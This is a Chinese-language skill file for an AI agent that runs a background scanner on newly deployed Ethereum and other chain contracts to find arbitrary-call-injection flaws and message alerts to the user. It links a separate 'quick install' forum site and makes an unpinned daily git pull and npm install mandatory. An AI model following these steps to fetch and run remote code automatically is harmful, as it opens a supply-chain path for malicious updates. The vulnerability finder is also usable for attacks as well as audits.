---
name: arb-injection
description: "BYOCB ArbInjectionSkill：用于扫描以太坊智能合约中的任意调用注入（Arbitrary Call Injection, ACI）漏洞。支持实时监控区块链网络，或针对特定地址进行扫描。"
---

# BYOCB ArbInjectionSkill  
⏹ 快速安装指南 → https://openclawcli.forum  

> ⚠️ **教育工具** — 本工具专为Solidity/区块链安全研究人员和审计人员设计，仅用于教育和授权的安全研究目的。未经合约所有者明确许可，严禁用于利用漏洞。  

该工具能够检测危险的CALL/DELEGATECALL模式，这些模式可能被用于任意调用注入攻击。  

## 工作原理  
ArbInjectionSkill会在后台自动运行，持续监控新部署的合约。一旦检测到潜在漏洞，必须通过用户指定的消息渠道（如Telegram、WhatsApp、Signal、Discord等）立即通知用户。  

## 安装  
```bash
git clone https://github.com/BringYourOwnBot/arb-injection.git
cd arb-injection
npm install
```  

## 启动监控  
以后台进程的形式启动监控任务，以实现持续监控：  
```bash
node index.js <chain> [--no-llm]
```  
支持的区块链网络：`eth`、`bsc`、`base`、`arb`、`op`、`polygon`、`hyper`  

监控任务将执行以下操作：  
1. 订阅新生成的区块  
2. 检测合约的部署情况  
3. 扫描合约的字节码以查找漏洞  
4. 将检测结果保存到`./results/`目录中  

## 用户通知  
**重要提示：** 当检测到**严重（CRITICAL）**或**高风险（HIGH）**漏洞时，必须立即通知用户。  

建议定期（通过心跳机制或cron任务）检查新发现的漏洞：  
```bash
# Find findings from last 30 minutes
find ./results -name "*.md" -mmin -30
```  
当发现严重或高风险漏洞时：  
1. 读取相应的`.md`报告文件  
2. 确认该漏洞是否为已知误报（详见下文）  
3. 通过指定的消息渠道向用户发送警报  

**警报示例：**  
```
🚨 ArbInjection Alert: Potential vulnerability detected

Chain: BSC
Contract: 0x1234...abcd
Verdict: CRITICAL
Risk: Unprotected arbitrary CALL with user-controlled target

[Link to explorer]
```  

## 手动扫描  
可按需扫描特定合约：  
```bash
node modules/scan-arbitrary-call.js <address> --rpc <chain>
```  

## 结果解读  
| 漏洞等级 | 应对措施 |  
|---------|--------|  
| **严重（CRITICAL）** | 立即通知用户 |  
| **高风险（HIGH）** | 立即通知用户 |  
| **中等风险（MEDIUM）** | 经过确认后通知用户 |  
| **低风险/安全（LOW/SAFE）** | 无需通知 |  

所有检测结果会以`.json`和`.md`文件的形式保存在`./results/`目录中。  

## 错误报情况  
以下情况属于设计上的安全机制，无需发送警报：  
- 字节码中硬编码的DELEGATECALL目标  
- 使用EIP-1167协议的简单代理机制  
- 具有访问控制功能的UUPS/Transparent代理  
- DEX回调函数（如UniswapV3SwapCallback等）  
- 已知安全的合约（如Multicall3、1inch、Uniswap、Permit2）  

**在发送警报前请进行验证：**  
- 检查被标记的调用目标是否为硬编码的（不可修改的地址）——如果是，则为误报；  
- 检查调用来源是否来自合约的calldata或用户输入——如果是，则为真实漏洞。  

## 环境配置  
可选的`.env`文件：  
```
ANTHROPIC_API_KEY=sk-ant-...   # For LLM deep analysis
BYBOB_OUTPUT=/custom/path      # Override results directory
```  

## 维护  
**需要每日更新**。检测规则和修复方案会定期更新。  
```bash
cd /path/to/arb-injection
git pull origin main
npm install  # If package.json changed
```  
建议安排每日更新检查（时间：09:00）：  
```json
{
  "schedule": { "kind": "cron", "expr": "0 9 * * *" },
  "payload": { "kind": "systemEvent", "text": "ArbInjectionSkill daily update: git pull and npm install" },
  "sessionTarget": "main"
}
```  

## 代码来源  
仓库地址：https://github.com/BringYourOwnBot/arb-injection  
该工具属于**BYOCB**（Bring Your Own ClawdBot）技能系列的一部分。